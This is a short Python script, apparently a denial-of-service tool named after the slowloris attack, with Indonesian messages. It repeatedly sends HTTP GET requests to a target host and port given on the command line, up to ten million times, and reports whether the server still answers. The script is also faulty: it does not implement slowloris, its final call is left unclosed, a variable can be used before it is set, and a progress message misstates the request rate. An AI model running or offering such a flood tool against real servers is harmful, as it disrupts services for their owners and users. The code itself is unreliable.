import sys
import requests
import time

def main():
    if len(sys.argv) != 3:
        print("Penggunaan: python slowloris.py <target> <port>")
        sys.exit(1)
    
    target = sys.argv[1]
    port = int(sys.argv[2])

    start_time = time.time()
    for i in range(10000000):  # Atur jumlah permintaan sebagai diperlukan
        try:
            response = requests.get(f"http://{target}:{port}")
            if response.status_code == 200:
                print(f"Request Berhasil: {i+1} dari 10,000,000")
            else:
                print(f"Request Gagal: {i+1} dari 10,000,000")
        except Exception as e:
            print(f"Request Belum Dikirim: {i+1} dari 10,000,000")
        if (i+1) % 1000 == 0:
            print(f"Terupdate {i+1} dari 10,000,000 dalam 1 detik")
        if response.status_code == 200:
            print(f"HTTP: On")
        else:
            print(f"HTTP: Off")
        time.sleep(1)

if __name__ == "__main__":
    main(
